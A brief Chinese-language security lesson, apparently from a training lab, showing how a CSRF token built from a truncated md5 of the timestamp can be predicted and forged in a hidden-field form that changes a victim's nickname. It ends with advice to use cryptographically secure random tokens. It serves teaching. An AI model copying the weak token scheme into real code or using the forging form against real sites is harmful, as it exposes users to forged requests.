💻 攻击代码详解

// 弱Token生成代码（服务器端）
// 基于时间戳生成Token
$token = substr(md5(time()), 0, 8);

// 攻击代码（攻击者）
// 1. 获取当前时间戳（与服务器相同）
$current_time = time();

// 2. 使用相同算法生成Token
$predicted_token = substr(md5($current_time), 0, 8);

// 3. 构造攻击表单
<form action="csrf_token_weak.php" method="POST">
  <input type="hidden" name="action" value="update_weak">
  <input type="hidden" name="csrf_token" value="<?php echo $predicted_token; ?>">
  <input type="hidden" name="nickname" value="被攻击的用户">
</form>

// 为什么攻击成功？
1. Token基于时间戳生成，攻击者可预测
2. 攻击者知道生成算法（md5 + substr）
3. 攻击者与服务器时间基本同步
4. 生成的Token与服务器Token匹配

💡 安全建议

不要使用可预测的值生成Token（如时间戳、用户ID等）。应该使用加密安全的随机数生成器， 如 random_bytes() 或 openssl_random_pseudo_bytes()， 生成足够长度（至少32字节）的不可预测Token。
